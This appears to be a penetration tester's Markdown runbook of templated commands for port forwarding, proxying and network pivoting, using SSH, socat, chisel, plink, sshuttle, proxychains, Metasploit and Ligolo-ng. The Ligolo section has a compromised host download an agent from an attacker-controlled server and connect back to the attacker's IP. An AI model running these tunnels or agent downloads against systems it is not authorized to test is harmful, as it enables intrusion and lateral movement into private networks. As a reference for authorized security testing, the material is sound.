# Tunneling
<!--- Status 90% --->
<!--- Maybe add another tunneling agent --->

## Introduction

This runbook provides a guide to tunneling. It includes a variety of techniques and tools for port forwading, using a proxy, and setting up tunnels with agents.

## Table of Content

- [Tunneling](#tunneling)
  - [Introduction](#introduction)
  - [Table of Content](#table-of-content)
  - [Port Fowarding](#port-fowarding)
    - [SSH Tunneling/Local Port Forwarding](#ssh-tunnelinglocal-port-forwarding)
    - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
    - [Socat - Port Forward](#socat---port-forward)
    - [chisel  - Remote Port Forward](#chisel----remote-port-forward)
    - [Chisel - Local Port Forward](#chisel---local-port-forward)
    - [pklink - Remote Port Forward](#pklink---remote-port-forward)
  - [Proxying - Network Pivoting](#proxying---network-pivoting)
    - [sshuttle (Unix) - proxying](#sshuttle-unix---proxying)
    - [SSH + Proxychains](#ssh--proxychains)
    - [chisel  - Reverse Proxy](#chisel----reverse-proxy)
    - [chisel - Forward Proxy](#chisel---forward-proxy)
    - [metasploit - proxying](#metasploit---proxying)
  - [Tunneling with an aganet](#tunneling-with-an-aganet)
    - [Ligolo](#ligolo)

## Port Fowarding

### SSH Tunneling/Local Port Forwarding  

```sh
ssh user@<ip> -p port -L 8001:127.0.0.1:8080 -fN
```

### SSH Remote Port Forwarding

```sh
ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
```

### Socat - Port Forward

```sh
./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
```

### chisel  - Remote Port Forward 

```sh
# kali
./chisel server -p <LISTEN_PORT> --reverse &
```

```cmd
# windows
./chisel client <client_port>:<client_port> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
```

### Chisel - Local Port Forward

```cmd
# host
./chisel server -p <LISTEN_PORT>
```

```sh
# kali
./chisel client <client_port>:<client_port> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

### pklink - Remote Port Forward

```cmd
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
```

## Proxying - Network Pivoting

### sshuttle (Unix) - proxying  

```sh
sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

### SSH + Proxychains

edit /etc/proxychains.conf with socks4 127.0.0.1 8080
```sh
ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
```
  
### chisel  - Reverse Proxy

```sh
# kali
./chisel server -p LISTEN_PORT --reverse &
```
Host  
```cmd
./chisel client <TARGET_IP>:<LISTEN_PORT> R:socks &
```

### chisel - Forward Proxy  

Host  
```cmd
./chisel server -p <LISTEN_PORT> --socks5
```
```sh
# kali
./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
```

### metasploit - proxying

```sh
route add <ip>/24 1
route print
use auxiliary/server/socks_proxy
run
```

## Tunneling with an aganet

### [Ligolo](https://github.com/nicocha30/ligolo-ng)

```sh
# kali
sudo ip tuntap add user <user> mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:<port>
sudo ip route add <ip-range> dev ligolo
```

```
# host
wget http://<ip>/<linuxagent>
OR
iwr -uri http://<ip>/agent.exe -Outfile agent.exe
agent.exe -connect <attacker IP here>:<port> -ignore-cert
```

```sh
# kali
session
start
```

 <!--- Last Updated July 9, 2024 --->